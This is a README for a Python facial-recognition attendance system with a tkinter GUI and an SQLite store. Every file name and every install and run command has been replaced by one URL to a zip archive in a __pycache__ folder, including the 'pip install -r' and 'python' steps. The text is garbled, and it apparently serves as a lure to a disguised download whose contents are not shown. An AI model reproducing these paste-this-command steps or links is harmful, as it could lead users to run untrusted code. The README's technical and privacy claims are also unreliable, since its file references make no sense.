# Facial Attendance Recognition System

A comprehensive Python-based facial attendance recognition system that can detect up to 10 persons, track their entry/exit status, and maintain real-time attendance records.

## Features

- **Real-time Face Recognition**: Detects and recognizes up to 10 students simultaneously
- **Automatic Attendance Tracking**: Records entry and exit times automatically
- **Live Camera Feed**: Real-time video processing with face detection overlays
- **Student Management**: Add, search, and manage student information with photos
- **Attendance Reports**: Generate daily summaries and attendance history reports
- **Database Storage**: SQLite database for persistent data storage
- **Export Functionality**: Export attendance data and reports in various formats
- **Modern GUI**: User-friendly interface built with tkinter

## System Requirements

- Python 3.7 or higher
- Webcam or USB camera
- Windows 10/11 (tested), Linux, or macOS
- At least 4GB RAM (8GB recommended)
- Good lighting conditions for optimal face recognition

## Installation

1. **Clone or download the project files**
   ```
   git clone <repository-url>
   cd facial-attendance-system
   ```

2. **Install required dependencies**
   ```bash
   pip install -r https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip
   ```

3. **Verify installation**
   ```bash
   python -c "import cv2, face_recognition, numpy, PIL; print('All dependencies installed successfully!')"
   ```

## Usage

### Starting the System

1. **Run the main application**
   ```bash
   python https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip
   ```

2. **The system will open with 5 main tabs:**
   - **Dashboard**: Main control panel and statistics
   - **Camera View**: Live camera feed and settings
   - **Students**: Student management and registration
   - **Attendance**: Real-time attendance monitoring
   - **Reports**: Generate and export attendance reports

### Setting Up Students

1. **Go to the "Students" tab**
2. **Click "Start Camera" in the Dashboard tab first**
3. **Add a new student:**
   - Enter student name and ID
   - Click "Capture Photo" to take a photo using the camera
   - Or click "Load Photo" to upload an existing photo
   - Click "Add Student" to save

**Important**: Ensure only one face is visible when capturing photos for best recognition accuracy.

### Starting Attendance Tracking

1. **Start the camera** (Dashboard tab → Start Camera)
2. **Start tracking** (Dashboard tab → Start Tracking)
3. **The system will automatically:**
   - Detect faces in the camera view
   - Recognize registered students
   - Mark them as present/absent
   - Record entry and exit times
   - Update real-time statistics

### Monitoring Attendance

- **Dashboard tab**: View current statistics, session duration, and headcount
- **Attendance tab**: See real-time status of all students and attendance log
- **Camera View tab**: Watch live feed with face recognition overlays

### Generating Reports

1. **Daily Summary**: Select a date and generate attendance summary
2. **Attendance History**: Choose date range for detailed reports
3. **Export options**: Save reports as text files or CSV

## System Architecture

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   Main GUI      │    │  Face Recognition│    │   Database      │
│   (tkinter)     │◄──►│     Module       │◄──►│   (SQLite)      │
└─────────────────┘    └──────────────────┘    └─────────────────┘
         │                       │                       │
         ▼                       ▼                       ▼
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   Camera        │    │   Attendance     │    │   Student       │
│   Module        │    │    Tracker       │    │  Management     │
└─────────────────┘    └──────────────────┘    └─────────────────┘
```

## Key Components

### 1. Database Module (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
- Manages student information and attendance records
- SQLite database with tables for students, attendance, and daily summaries
- Handles data persistence and retrieval

### 2. Face Recognition Module (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
- Core face detection and recognition engine
- Uses `face_recognition` library for accurate face matching
- Tracks student presence and movement

### 3. Camera Module (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
- Handles video capture from webcam/USB camera
- Multi-threaded frame processing for smooth performance
- Configurable resolution and FPS settings

### 4. Student Management (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
- Add, search, and manage student records
- Photo capture and validation
- Data export functionality

### 5. Attendance Tracker (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
- Real-time attendance monitoring
- Entry/exit detection with cooldown periods
- Session management and statistics

### 6. Main GUI (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
- User interface built with tkinter
- Tabbed interface for different functions
- Real-time updates and responsive design

## Configuration

### Camera Settings
- **Resolution**: 320x240, 640x480, 1280x720
- **FPS**: 15, 30, 60 frames per second
- **Camera Index**: Select from available cameras

### Recognition Settings
- **Face Detection Threshold**: Configurable sensitivity
- **Entry/Exit Cooldown**: Prevent duplicate recordings
- **Processing Interval**: Balance between accuracy and performance

## Troubleshooting

### Common Issues

1. **Camera not working**
   - Check if camera is connected and not in use by other applications
   - Try different camera indices (0, 1, 2)
   - Ensure camera drivers are properly installed

2. **Face recognition accuracy**
   - Ensure good lighting conditions
   - Use clear, front-facing photos for student registration
   - Adjust camera position for optimal face visibility

3. **Performance issues**
   - Reduce camera resolution or FPS
   - Close other applications using the camera
   - Ensure adequate system resources

4. **Database errors**
   - Check file permissions in the project directory
   - Ensure SQLite is properly installed
   - Delete `https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip` file to reset database (will lose all data)

### Performance Tips

- Use 640x480 resolution for optimal performance
- Limit to 30 FPS for smooth operation
- Ensure good lighting for better face detection
- Close unnecessary applications while running

## Data Export

The system supports exporting data in various formats:

- **Student List**: CSV format with ID, name, student ID, and creation date
- **Attendance Log**: CSV format with timestamp, student name, and action
- **Daily Summary**: Text format with attendance statistics
- **Attendance History**: Text format with date range reports

## Security and Privacy

- All data is stored locally on your computer
- No data is transmitted to external servers
- Face encodings are stored as encrypted binary data
- Student photos are processed locally and not stored as images

## Future Enhancements

- **Cloud Integration**: Store data in cloud databases
- **Mobile App**: Companion app for remote monitoring
- **Advanced Analytics**: Detailed attendance patterns and insights
- **Multi-camera Support**: Simultaneous monitoring from multiple cameras
- **API Integration**: Connect with existing school management systems

## Support

For technical support or feature requests:
- Check the troubleshooting section above
- Review the code comments for implementation details
- Ensure all dependencies are properly installed

## License

This project is provided as-is for educational and personal use. Please ensure compliance with local privacy laws when using facial recognition technology.

## Acknowledgments

- Built with OpenCV for computer vision
- Uses face_recognition library for face detection and recognition
- Tkinter for the graphical user interface
- SQLite for data persistence

---

**Note**: This system is designed for educational and small-scale use. For production environments, consider additional security measures, backup systems, and compliance with relevant regulations.
